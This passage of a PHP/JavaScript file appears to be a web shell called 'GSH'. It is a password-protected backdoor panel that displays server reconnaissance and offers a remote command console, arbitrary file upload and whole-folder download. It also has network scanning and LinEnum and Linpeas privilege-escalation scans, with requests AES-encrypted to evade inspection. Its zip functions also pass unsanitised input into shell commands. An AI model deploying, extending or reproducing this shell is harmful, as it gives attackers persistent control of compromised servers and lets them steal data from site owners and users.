                            onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
                        <button class="btn btn-outline-primary" 
                            style="min-width: 100px; padding: 8px 20px;" 
                            type="button" 
                            onclick="confirmZipFolder(\'' . htmlspecialchars($foldername) . '\')">Start Compression</button>
                    </div>
                </div>
                ';
            } else {
                echo json_encode(['success' => false, 'error' => 'Folder does not exist']);
            }
        }
    }

    function handleZipFile() {
        if(isset($_POST['filename']) && isset($_POST['confirm'])) {
            $filename = $_POST['filename'];
            $zipname = $_POST['zipname'] ?? basename($filename, '.' . pathinfo($filename, PATHINFO_EXTENSION)) . '.zip';
            
            if (file_exists($filename) && is_file($filename)) {
                $zipPath = dirname($filename) . '/' . $zipname;
                
                // 使用 bash zip 命令
                $command = "zip '" . $zipPath . "' '" . $filename . "'";
                $output = exe($command);
                
                if (file_exists($zipPath)) {
                    echo json_encode(['success' => true, 'message' => 'File compressed successfully', 'zipfile' => $zipname]);
                } else {
                    echo json_encode(['success' => false, 'error' => 'Compressed file creation failed: ' . $output]);
                }
            } else {
                echo json_encode(['success' => false, 'error' => 'File does not exist']);
            }
        } else {
            $filename = $_POST['filename'] ?? '';
            if (file_exists($filename) && is_file($filename)) {
                $fileExt = pathinfo($filename, PATHINFO_EXTENSION);
                $fileNameWithoutExt = basename($filename, '.' . $fileExt);
                $defaultZipName = $fileNameWithoutExt . '.zip';
                echo '
                <div id="zipFileContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                    <div class="mb-3">
                        <h5>Compress File</h5>
                        <p>File: <strong>' . htmlspecialchars(basename($filename)) . '</strong></p>
                        <input type="text" id="zipFileName" class="form-control bg-secondary text-light mb-3" 
                            value="' . htmlspecialchars($defaultZipName) . '" 
                            placeholder="ZIP File Name">
                        <p class="text-info">This operation will create a ZIP file containing the selected file.</p>
                    </div>
                    <div class="d-flex justify-content-center gap-2">
                        <button class="btn btn-outline-secondary" 
                            style="min-width: 100px; padding: 8px 20px;" 
                            type="button" 
                            onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
                        <button class="btn btn-outline-primary" 
                            style="min-width: 100px; padding: 8px 20px;" 
                            type="button" 
                            onclick="confirmZipFile(\'' . htmlspecialchars($filename) . '\')">Start Compression</button>
                    </div>
                </div>
                ';
            } else {
                echo json_encode(['success' => false, 'error' => 'File does not exist']);
            }
        }
    }

    function handleDownloadFile() {
        $filename = $_POST['filename'] ?? '';
        
        if (file_exists($filename) && is_file($filename)) {
            // 創建臨時 ZIP 檔案
            $tempZipName = 'download_' . basename($filename, '.' . pathinfo($filename, PATHINFO_EXTENSION)) . '_' . time() . '.zip';
            $tempZipPath = sys_get_temp_dir() . '/' . $tempZipName;
            
            // 使用 bash zip 命令
            $command = "zip '" . $tempZipPath . "' '" . $filename . "'";
            $output = exe($command);
            
            if (file_exists($tempZipPath)) {
                // 設置下載標頭
                header('Content-Type: application/zip');
                header('Content-Disposition: attachment; filename="' . $tempZipName . '"');
                header('Content-Length: ' . filesize($tempZipPath));
                header('Cache-Control: no-cache, must-revalidate');
                header('Pragma: no-cache');
                
                // 輸出檔案內容
                readfile($tempZipPath);
                
                // 刪除臨時檔案
                unlink($tempZipPath);
                exit;
            } else {
                echo json_encode(['success' => false, 'error' => 'Temporary compressed file creation failed: ' . $output]);
            }
        } else {
            echo json_encode(['success' => false, 'error' => 'File does not exist']);
        }
    }

    function handleDownloadFolder() {
        $foldername = $_POST['foldername'] ?? '';
        
        if (is_dir($foldername)) {
            // 創建臨時 ZIP 檔案
            $tempZipName = 'download_' . basename($foldername) . '_' . time() . '.zip';
            $tempZipPath = sys_get_temp_dir() . '/' . $tempZipName;
            
            // 使用 bash zip 命令
            $command = "zip -r '" . $tempZipPath . "' '" . $foldername . "'";
            $output = exe($command);
            
            if (file_exists($tempZipPath)) {
                // 設置下載標頭
                header('Content-Type: application/zip');
                header('Content-Disposition: attachment; filename="' . $tempZipName . '"');
                header('Content-Length: ' . filesize($tempZipPath));
                header('Cache-Control: no-cache, must-revalidate');
                header('Pragma: no-cache');
                
                // 輸出檔案內容
                readfile($tempZipPath);
                
                // 刪除臨時檔案
                unlink($tempZipPath);
                exit;
            } else {
                echo json_encode(['success' => false, 'error' => 'Temporary compressed file creation failed: ' . $output]);
            }
        } else {
            echo json_encode(['success' => false, 'error' => 'Folder does not exist']);
        }
    }

    function handleFileUpload() {
        if (isset($_POST['data']) && isset($_POST['filename'])) {
            $data = $_POST['data'];
            $filename = $_POST['filename'];

            $decodedData = base64_decode($data);
            if ($decodedData === false) {
                http_response_code(400);
                echo json_encode(['error' => 'Unable to decode file data']);
                return;
            }

            if (file_put_contents($filename, $decodedData) !== false) {
                echo json_encode(['success' => 'File uploaded successfully']);
            } else {
                http_response_code(500);
                echo json_encode(['error' => 'Failed to save file']);
            }
        } else {
            http_response_code(400);
            echo json_encode(['error' => 'No data received']);
        }
    }



    $_data = array_merge($_POST, $_GET);
    
?>

<?php 
    $sql = ON_and_OFF(function_exists('mysqli_connect'));
    $curl = ON_and_OFF(function_exists('curl_init'));
    $wget = ON_and_OFF(exe('wget --help'));
    $pl = ON_and_OFF(exe('perl --help'));
    $py = ON_and_OFF(exe('python --help'));
    $gcc = ON_and_OFF(exe('gcc --version'));
    $disfunc = @ini_get("disable_functions");
    $kernel = php_uname();
    $phpver = PHP_VERSION;
    $phpos = PHP_OS;
    $SNAME = $_SERVER["SERVER_NAME"];
    $SSOFT = $_SERVER["SERVER_SOFTWARE"];
    $HOST = gethostbyname($_SERVER['HTTP_HOST']);
    $CLIENT = $_SERVER['REMOTE_ADDR'];
    $disfunc = empty($disfunc) ? "<gr>NONE</gr>" : "<rd>$disfunc</rd>";

    if(!function_exists('posix_getegid')) {
        $user = @get_current_userror_banner();
        $uid = @getmyuid();
        $gid = @getmygid();
        $group = "?";
    } else {
        $uid = @posix_getpwuid(posix_geteuid());
        $gid = @posix_getgrgid(posix_getegid());
        $user = $uid['name'];
        $uid = $uid['uid'];
        $group = $gid['name'];
        $gid = $gid['gid'];
    }
    $SAFE_MODE = ON_and_OFF(@ini_get(strtolower("safe_mode")) == 'on');
?>

<!DOCTYPE html>
<html>
<head>
    <meta http-equiv='content-type' content='text/html; charset=UTF-8'>
    <title>GSH</title>
    <meta charset='UTF-8'>
    <!--<meta name='author' content=''>-->
    <meta name='viewport' content='width=device-width, initial-scale=0.70'>
    <!--<link rel='icon' href='favicon.ico'>-->
    <link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css'>
    <link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css'>
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css'>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <script src='https://cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
    <script src='https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
    <script src='https://code.jquery.com/jquery-3.3.1.slim.min.js'></script>
    <style>
        * {
            font-family: 'Roboto', sans-serif;
            font-weight: 400;
        }
        
        body {
            background: #121212;
            color: #ffffff;
        }
        
        gr {
            color: #4caf50;
        }
        rd {
            color: #f44336;
        }
        
        .md-card {
            background: #1e1e1e;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.3), 0 1px 2px rgba(0,0,0,0.2);
            transition: box-shadow 0.3s ease;
        }
        
        .md-card:hover {
            box-shadow: 0 4px 8px rgba(0,0,0,0.4), 0 2px 4px rgba(0,0,0,0.3);
        }
        
        .md-btn {
            border-radius: 4px;
            text-transform: uppercase;
            font-weight: 500;
            letter-spacing: 0.5px;
            transition: all 0.3s ease;
            border: none;
            padding: 12px 24px;
        }
        
        .md-btn-primary {
            background: #2196f3;
            color: white;
        }
        
        .md-btn-primary:hover {
            background: #1976d2;
            box-shadow: 0 2px 4px rgba(33, 150, 243, 0.3);
        }
        
        .md-btn-secondary {
            background: #757575;
            color: white;
        }
        
        .md-btn-secondary:hover {
            background: #616161;
        }
        
        .md-btn-danger {
            background: #f44336;
            color: white;
        }
        
        .md-btn-danger:hover {
            background: #d32f2f;
        }
        
        .md-input {
            border: none;
            border-bottom: 2px solid #424242;
            border-radius: 0;
            padding: 12px 0;
            background: transparent;
            color: #ffffff;
            transition: border-color 0.3s ease;
        }
        
        .md-input:focus {
            outline: none;
            border-bottom-color: #2196f3;
            box-shadow: 0 1px 0 0 #2196f3;
        }
        
        .md-table {
            background: #1e1e1e;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }
        
        .md-table th {
            background: #2d2d2d;
            color: #ffffff;
            font-weight: 500;
            padding: 16px;
            border: none;
        }
        
        .md-table td {
            padding: 16px;
            border-bottom: 1px solid #424242;
            color: #ffffff;
        }
        
        .md-table tr:hover {
            background: #2d2d2d;
        }
        
        .md-navbar {
            background: #1a1a1a;
            color: white;
            padding: 16px 24px;
            border-radius: 0 0 8px 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
            border-bottom: 2px solid #2196f3;
        }
        
        .md-login-container {
            min-height: 100vh;
            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .md-login-card {
            background: #1e1e1e;
            border-radius: 16px;
            padding: 48px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
            width: 400px;
            max-width: 90vw;
            border: 1px solid #424242;
        }
        
        .md-toolbar {
            background: #1e1e1e;
            border-radius: 8px;
            padding: 16px;
            margin: 16px 0;
            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
            border: 1px solid #424242;
        }
        
        .md-dialog {
            background: #1e1e1e;
            border-radius: 12px;
            padding: 24px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
            max-width: 500px;
            margin: 0 auto;
            border: 1px solid #424242;
        }
        
        .md-fab {
            position: fixed;
            bottom: 24px;
            right: 24px;
            width: 56px;
            height: 56px;
            border-radius: 50%;
            background: #2196f3;
            color: white;
            border: none;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            transition: all 0.3s ease;
            z-index: 1000;
        }
        
        .md-fab:hover {
            transform: scale(1.1);
            box-shadow: 0 6px 12px rgba(0,0,0,0.3);
        }
        
        .md-progress {
            height: 4px;
            background: #424242;
            border-radius: 2px;
            overflow: hidden;
        }
        
        .md-progress-bar {
            height: 100%;
            background: #2196f3;
            transition: width 0.3s ease;
        }
        
        .md-badge {
            background: #f44336;
            color: white;
            border-radius: 12px;
            padding: 4px 8px;
            font-size: 12px;
            font-weight: 500;
        }
        
        /* 響應式設計 */
        @media (max-width: 768px) {
            .md-login-card {
                padding: 32px 24px;
                width: 90vw;
            }
            
            .md-navbar {
                padding: 12px 16px;
            }
        }
    </style>
</head>
<body>
    <?php if (!isLoggedIn()): ?>
    <div class='md-login-container'>
        <div class='md-login-card'>
            <div class='text-center mb-4'>
                <i class='material-icons' style='font-size: 48px; color: #2196f3; margin-bottom: 16px;'>fingerprint</i>
                <h3 class='mb-2' style='color: #ffffff; font-weight: 500;'>GSH</h3>
            </div>
            
            <?php if (isset($login_error)): ?>
            <div class='alert alert-danger' role='alert' style='background: #ffebee; color: #c62828; border: none; border-radius: 4px; padding: 12px; margin-bottom: 24px;'>
                <i class='material-icons' style='font-size: 20px; vertical-align: middle; margin-right: 8px;'>error</i>
                <?php echo htmlspecialchars($login_error); ?>
            </div>
            <?php endif; ?>
            
            <form method='post' action=''>
                <div class='mb-4'>
                    <input type='password' class='md-input w-100' id='password' name='password' required style='font-size: 16px;'>
                </div>
                <div class='d-grid'>
                    <button type='submit' name='login' class='md-btn md-btn-primary'>
                        <i class='material-icons' style='font-size: 20px; vertical-align: middle; margin-right: 8px;'>login</i>
                        Login
                    </button>
                </div>
            </form>
        </div>
    </div>
    <?php else: ?>
    <div class='container-fluid'>
        <div class='py-3' id='main'>
            <div class='md-navbar'>
                <div class='d-flex justify-content-between align-items-center'>
                    <div class='d-flex align-items-center'>
                        <i class='material-icons' style='font-size: 32px; margin-right: 16px;'>terminal</i>
                        <div>
                            <h4 class='m-0' style='font-weight: 500;'>GSH</h4>
                            <div style='font-size: 14px; opacity: 0.9;'>
                                <i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>folder</i>
                                /<?php
                                if(isset($_GET[0])){
                                    // 解密 path 參數
                                    $encrypted_path = $_GET[0];
                                    $cpath = fernet_decrypt($encrypted_path);
                                    if($cpath === false) {
                                        $cpath = getcwd(); // 如果解密失敗，使用當前目錄
                                    }
                                    chdir($cpath);
                                }else{
                                    $cpath = getcwd();
                                }
                                $cpath = str_replace('\\','/',$cpath);
                                $pathds = explode('/',$cpath);
                                $temp = "/";
                                foreach($pathds as $pdir){
                                    if($pdir == '') continue;
                                    $temp = $temp . $pdir . '/';
                                    // 加密路徑參數
                                    $encrypted_temp = fernet_encrypt($temp);
                                    echo "<a class='text-decoration-none text-white' href='?0=" . urlencode($encrypted_temp) ."' style='opacity: 0.9;'>$pdir</a>/";
                                }
                                echo "<span style='opacity: 0.7;'>[".writable($cpath, get_permit($cpath))."]</span>";
                                ?>
                            </div>
                        </div>
                    </div>
                    <div class='text-end'>
                        <a href='?op=logout' class='md-btn md-btn-danger' style='padding: 8px 16px; font-size: 14px;'>
                            <i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>logout</i>
                            Logout
                        </a>
                    </div>
                </div>
            </div>
        <div class='container-fluid'>
            <div class='collapse mb-3' id='collapseExample'>
                <div class='md-card p-3'>
                    <?php
                    echo"
                    <table class='w-100' style='color: #ffffff;'>
                        <tr>
                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>System</th> <td style='padding: 8px;'><gr>$kernel</gr></td>
                        </tr>
                        <tr>
                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>User</th> <td style='padding: 8px;'><gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)</td>
                        </tr>
                        <tr>
                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>PHP Version</th> <td style='padding: 8px;'><gr>$phpver</gr></td>
                        </tr>
                        <tr>
                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>PHP OS</th> <td style='padding: 8px;'><gr>$phpos</gr></td>
                        </tr>
                        <tr>
                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>Software</th> <td style='padding: 8px;'><gr>$SSOFT</gr></td>
                        </tr>
                        <tr>
                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>Domain</th> <td style='padding: 8px;'><gr>$SNAME</gr></td>
                        </tr>
                        <tr>
                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>Server IP</th> <td style='padding: 8px;'><gr>$HOST</gr></td>
                        </tr>
                        <tr>
                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>Client IP</th> <td style='padding: 8px;'><gr>$CLIENT</gr></td>
                        </tr>
                        <tr>
                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>Safe Mode</th> <td style='padding: 8px;'>$SAFE_MODE</td>
                        </tr>
                        <tr>
                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>Disable Function</th> <td style='padding: 8px;'>$disfunc</td>
                        </tr>
                    </table>
                    <div style='margin-top: 16px; padding: 12px; background: #2d2d2d; border-radius: 4px; color: #b0b0b0;'>
                        MySQL: $sql | Perl: $pl | WGET: $wget | CURL: $curl | Python: $py | GCC: $gcc
                    </div>";
                    ?>
                </div>
            </div>
        </div>
        <div class='md-toolbar'>
            <div class='d-flex justify-content-center flex-wrap gap-2'>
                <button class='md-btn md-btn-secondary' data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'>
                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>info</i>
                    Info
                </button>
                <button class='md-btn md-btn-primary' onclick="showUploadInterface()">
                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>upload</i>
                    Upload
                </button>
                <button class='md-btn md-btn-secondary' onclick="showConsole()">
                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>terminal</i>
                    Console
                </button>
                <button class='md-btn md-btn-secondary' onclick="showNetworkScan()">
                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>network_check</i>
                    Network Scan
                </button>
                <button class='md-btn md-btn-secondary' onclick="showLinEnum()">
                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>security</i>
                    LinEnum Scan
                </button>
                <button class='md-btn md-btn-secondary' onclick="showLinpeas()">
                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>bug_report</i>
                    Linpeas Scan
                </button>
                <button class='md-btn md-btn-secondary' onclick="showHtaccess()">
                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>settings</i>
                    Create Htaccess
                </button>
                <button class='md-btn md-btn-secondary' onclick="showSearchFile()">
                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>search</i>
                    Search Filename
                </button>
                <button class='md-btn md-btn-secondary' onclick="showSearchContent()">
                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>search</i>
                    Search Content
                </button>
            </div>
        </div>
    </div>

    <div id='file-container' class='container-fluid mt-4'>
        <?php listFilesInDirectory(getcwd());?>
    </div>

    <div class="container-fluid mt-4" id="uploadInterface" style="display: none;">
        <div class="dialog-container bg-dark text-light p-3 rounded d-flex justify-content-center align-items-center" style="height: 200px;">
            <div id="fileSelectionStep" class="text-center">
                <input type="file" id="fileInput" style="display: none;">
                <button class="btn btn-outline-light btn-lg" onclick="document.getElementById('fileInput').click()">
                    <i class="bi bi-file-earmark-arrow-up" style="font-size: 3rem;"></i>
                </button>
            </div>
            <div id="uploadConfirmationStep" style="display: none;">
                <div class="text-center">
                    <span id="selectedFileName" class="text-light d-block mb-3"></span>
                    <div class="d-flex justify-content-center">
                        <button class="btn btn-outline-secondary me-2" onclick="cancelUpload()">取消</button>
                        <button class="btn btn-outline-primary" onclick="uploadFile()">確認上傳</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <script>
		const currentScript = "<?= basename(__FILE__) ?>";
		
		const fernetKey = "<?= $fernet_key ?>";
		
		// 將 Base64 字符串轉換為 ArrayBuffer
		function base64ToArrayBuffer(base64) {
			const binaryString = atob(base64);
			const bytes = new Uint8Array(binaryString.length);
			for (let i = 0; i < binaryString.length; i++) {
				bytes[i] = binaryString.charCodeAt(i);
			}
			return bytes.buffer;
		}
		
		// 將 ArrayBuffer 轉換為 Base64 字符串
		function arrayBufferToBase64(buffer) {
			const bytes = new Uint8Array(buffer);
			let binary = '';
			for (let i = 0; i < bytes.byteLength; i++) {
				binary += String.fromCharCode(bytes[i]);
			}
			return btoa(binary);
		}
		
		// Fernet 加密函數
		async function fernetEncrypt(data) {
			try {
				console.log('Starting encryption with key:', fernetKey);
				
				// 生成隨機 IV (16 bytes)
				const iv = crypto.getRandomValues(new Uint8Array(16));
				console.log('Generated IV:', iv);
				
				// 將 key 轉換為 ArrayBuffer
				const keyBuffer = base64ToArrayBuffer(fernetKey);
				console.log('Key buffer length:', keyBuffer.byteLength);
				
				// 導入 key (使用 AES-256-CBC 以匹配 PHP 端)
				const key = await crypto.subtle.importKey(
					'raw',
					keyBuffer,
					{ name: 'AES-CBC', length: 256 },
					false,
					['encrypt']
				);
				console.log('Key imported successfully');
				
				// 加密數據
				const encoder = new TextEncoder();
				const dataBuffer = encoder.encode(data);
				console.log('Data buffer length:', dataBuffer.length);
				
				const encryptedBuffer = await crypto.subtle.encrypt(
					{ name: 'AES-CBC', iv: iv },
					key,
					dataBuffer
				);
				console.log('Encryption completed');
				
				// 組合 IV + 加密數據
				const combined = new Uint8Array(iv.length + encryptedBuffer.byteLength);
				combined.set(iv);
				combined.set(new Uint8Array(encryptedBuffer), iv.length);
				
				// Base64 編碼
				const result = arrayBufferToBase64(combined);
				console.log('Base64 encoding completed');
				return result;
			} catch (error) {
				console.error('Encryption error:', error);
				throw new Error('Encryption failed: ' + error.message);
			}
		}
		
		// 解密 GET 參數的函數
		async function decryptGetParam(encryptedParam) {
			try {
				// 解密參數
				const decrypted = await fernetDecrypt(encryptedParam);
				return decrypted;
			} catch (error) {
				console.error('Decrypt GET param error:', error);
				return null;
			}
		}

		// Fernet 解密函數
		async function fernetDecrypt(encryptedData) {
			try {
				const combined = base64ToArrayBuffer(encryptedData);
				const combinedArray = new Uint8Array(combined);
				const iv = combinedArray.slice(0, 16);
				const encrypted = combinedArray.slice(16);
				const keyBuffer = base64ToArrayBuffer(fernetKey);
				const key = await crypto.subtle.importKey(
					'raw',
					keyBuffer,
					{ name: 'AES-CBC', length: 256 },
					false,
					['decrypt']
				);
				const decryptedBuffer = await crypto.subtle.decrypt(
					{ name: 'AES-CBC', iv: iv },
					key,
					encrypted
				);

				const decoder = new TextDecoder();
				return decoder.decode(decryptedBuffer);
			} catch (error) {
				console.error('Decryption error:', error);
				throw new Error('Decryption failed: ' + error.message);
			}
		}

		// 加密並發送 POST 請求的通用函數
		async function sendEncryptedPost(url, data) {
			try {
				console.log('sendEncryptedPost called with data:', data);

				const formData = new URLSearchParams(data);
				const dataString = formData.toString();
				console.log('Form data string:', dataString);
				
				const encryptedData = await fernetEncrypt(dataString);
				console.log('Encrypted data length:', encryptedData.length);

				const response = await fetch(url, {
					method: 'POST',
					headers: {
						'Content-Type': 'application/x-www-form-urlencoded',
					},
					body: encryptedData
				});
				
				console.log('Response status:', response.status);
				return response;
			} catch (error) {
				console.error('Send encrypted POST error:', error);
				throw error;
			}
		}
		
		// 通用的加密 fetch 替換函數
		async function encryptedFetch(url, data) {
			return await sendEncryptedPost(url, data);
		}

		// 獲取解密後的 path 參數
		async function getDecryptedPath() {
			const urlParams = new URLSearchParams(window.location.search);
			const encryptedPath = urlParams.get('0');
			if (encryptedPath) {
				return await decryptGetParam(decodeURIComponent(encryptedPath));
			}
			return null;
		}
		
		function hideAllInterfaces() {
			document.getElementById('file-container').style.display = 'none';
			document.getElementById('uploadInterface').style.display = 'none';
			let dialogContainers = document.querySelectorAll('.dialog-container');
			dialogContainers.forEach(container => {
				container.style.display = 'none';
			});
		}

		function showUploadInterface() {
			hideAllInterfaces();
			document.getElementById('uploadInterface').style.display = 'block';
			document.getElementById('fileSelectionStep').style.display = 'block';
			document.getElementById('uploadConfirmationStep').style.display = 'none';
		}

		function hideUploadInterface() {
			document.getElementById('uploadInterface').style.display = 'none';
			document.getElementById('file-container').style.display = 'block';
			resetUploadInterface();
		}

		function resetUploadInterface() {
			document.getElementById('fileSelectionStep').style.display = 'block';
			document.getElementById('uploadConfirmationStep').style.display = 'none';
			document.getElementById('selectedFileName').textContent = '';
			document.getElementById('fileInput').value = '';
		}

		document.getElementById('fileInput').addEventListener('change', function() {
			if (this.files.length) {
				document.getElementById('selectedFileName').textContent = this.files[0].name;
				document.getElementById('fileSelectionStep').style.display = 'none';
				document.getElementById('uploadConfirmationStep').style.display = 'block';
			}
		});

		function cancelUpload() {
			resetUploadInterface();
		}

		function uploadFile() {
			const fileInput = document.getElementById('fileInput');
			if (fileInput.files.length === 0) {
				alert('Please select a file first');
				return;
			}

			const file = fileInput.files[0];
			const reader = new FileReader();

			reader.onload = function(e) {
				const base64Data = e.target.result.split(',')[1];
				sendBase64Data(base64Data, file.name);
			};

			reader.readAsDataURL(file);
		}

		async function sendBase64Data(base64Data, fileName) {
			const data = {
				'data': base64Data,
				'op': 'upload',
				'filename': fileName
			};

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const result = await response.text();
				console.log('Success:', result);
				alert('Upload successful!');
				location.reload();
			} catch (error) {
				console.error('Error:', error);
				alert('Upload failed!');
			}
		}

		async function showConsole() {
			hideAllInterfaces();
			try {
				const response = await sendEncryptedPost(currentScript, { 'op': 'console' });
				const html = await response.text();
				
				let consoleContainer = document.getElementById('consoleContainer');
				if (!consoleContainer) {
					consoleContainer = document.createElement('div');
					consoleContainer.id = 'consoleContainer';
					consoleContainer.className = 'dialog-container';
					document.body.appendChild(consoleContainer);
				}
				
				consoleContainer.innerHTML = html;
				consoleContainer.style.display = 'block';
				
				// 調整輸入框和按鈕的寬度
				const cmdInput = document.getElementById('cmdInput');
				const executeButton = document.querySelector('#consoleForm button');
				if (cmdInput && executeButton) {
					cmdInput.style.width = 'calc(100% - 100px)';
					executeButton.style.width = '90px';
				}
				
				document.getElementById('cmdInput').addEventListener('keypress', function(e) {
					if (e.key === 'Enter') {
						executeCommand();
					}
				});
			} catch (error) {
				console.error('Error showing console:', error);
			}
		}

		async function executeCommand() {
			const cmd = document.getElementById('cmdInput').value;
			const encodedCmd = btoa(unescape(encodeURIComponent(cmd)));
			
			try {
				const response = await sendEncryptedPost(currentScript, {
					'op': 'console',
					'cmd': encodedCmd
				});
				const data = await response.json();
				
				const outputDiv = document.getElementById('consoleOutput');
				outputDiv.innerHTML = `<div class="mb-2"><strong>$</strong> ${cmd}</div><pre>${data.output}</pre>`;
				outputDiv.scrollTop = outputDiv.scrollHeight;
				document.getElementById('cmdInput').value = '';
			} catch (error) {
				console.error('Error executing command:', error);
			}
		}

		async function showNetworkScan() {
			hideAllInterfaces();
			try {
				const response = await sendEncryptedPost(currentScript, { 'op': 'netscan' });
				const html = await response.text();
				
				let consoleContainer = document.getElementById('consoleContainer');
				if (!consoleContainer) {
					consoleContainer = document.createElement('div');
					consoleContainer.id = 'consoleContainer';
					consoleContainer.className = 'dialog-container';
					document.body.appendChild(consoleContainer);
				}
				
				consoleContainer.innerHTML = html;
				consoleContainer.style.display = 'block';
			} catch (error) {
				console.error('Error showing network scan:', error);
			}
		}

		async function executeNetworkScan() {
			try {
				const response = await sendEncryptedPost(currentScript, {
					'op': 'netscan',
					'execute': '1'
				});
				const data = await response.json();
				document.getElementById('networkScanOutput').innerHTML = `<pre>${data.output}</pre>`;
			} catch (error) {
				console.error('Error executing network scan:', error);
			}
		}

		async function showLinEnum() {
			hideAllInterfaces();
			try {
				const response = await sendEncryptedPost(currentScript, { 'op': 'linenum' });
				const html = await response.text();
				
				let consoleContainer = document.getElementById('consoleContainer');
				if (!consoleContainer) {
					consoleContainer = document.createElement('div');
					consoleContainer.id = 'consoleContainer';
					consoleContainer.className = 'dialog-container';
					document.body.appendChild(consoleContainer);
				}
				
				consoleContainer.innerHTML = html;
				consoleContainer.style.display = 'block';
			} catch (error) {
				console.error('Error showing LinEnum:', error);
			}
		}

		async function executeLinEnum() {
			try {
				const response = await sendEncryptedPost(currentScript, {
					'op': 'linenum',
					'execute': '1'
				});
				const result = await response.json();
				document.getElementById('linEnumOutput').innerHTML = `<pre>${result.output}</pre>`;
			} catch (error) {
				console.error('Error executing LinEnum:', error);
			}
		}

		async function showLinpeas() {
			hideAllInterfaces();
			try {
				const response = await sendEncryptedPost(currentScript, { 'op': 'linpeas' });
				const html = await response.text();
				
				let consoleContainer = document.getElementById('consoleContainer');
				if (!consoleContainer) {
					consoleContainer = document.createElement('div');
					consoleContainer.id = 'consoleContainer';
					consoleContainer.className = 'dialog-container';
					document.body.appendChild(consoleContainer);
				}
				
				consoleContainer.innerHTML = html;
				consoleContainer.style.display = 'block';
			} catch (error) {
				console.error('Error showing Linpeas:', error);
			}
		}

		async function executeLinpeas() {
			try {
				const response = await sendEncryptedPost(currentScript, {
					'op': 'linpeas',
					'execute': '1'
				});
				const result = await response.json();
				document.getElementById('linpeasOutput').innerHTML = `<pre>${result.output}</pre>`;
			} catch (error) {
				console.error('Error executing Linpeas:', error);
			}
		}

        async function showSearchFile() {
			hideAllInterfaces();
			const path = await getDecryptedPath();

			let data = { 'op': 'searchfile' };
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const html = await response.text();
				
				let searchFileContainer = document.getElementById('searchFileContainer');
				if (!searchFileContainer) {
					searchFileContainer = document.createElement('div');
					searchFileContainer.id = 'searchFileContainer';
					searchFileContainer.className = 'dialog-container';
					document.body.appendChild(searchFileContainer);
				}
				
				searchFileContainer.innerHTML = html;
				searchFileContainer.style.display = 'block';
				
				document.getElementById('filenameInput').addEventListener('keypress', function(e) {
					if (e.key === 'Enter') {
						searchFile();
					}
				});
			} catch (error) {
				console.error('Error showing search file:', error);
			}
		}

		        		async function searchFile() {
			const filename = document.getElementById('filenameInput').value;
			const path = await getDecryptedPath();

			let data = {
				'op': 'searchfile',
				'filename': filename
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const result = await response.json();
				
				const outputDiv = document.getElementById('searchFileOutput');
				outputDiv.innerHTML = `<pre>${result.output}</pre>`;
				outputDiv.scrollTop = outputDiv.scrollHeight;
			} catch (error) {
				console.error('Error searching file:', error);
			}
		}

        async function showSearchContent() {
			hideAllInterfaces();
			const path = await getDecryptedPath();

			let data = { 'op': 'searchcontent' };
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const html = await response.text();
				
				let searchContentContainer = document.getElementById('searchContentContainer');
				if (!searchContentContainer) {
					searchContentContainer = document.createElement('div');
					searchContentContainer.id = 'searchContentContainer';
					searchContentContainer.className = 'dialog-container';
					document.body.appendChild(searchContentContainer);
				}
				
				searchContentContainer.innerHTML = html;
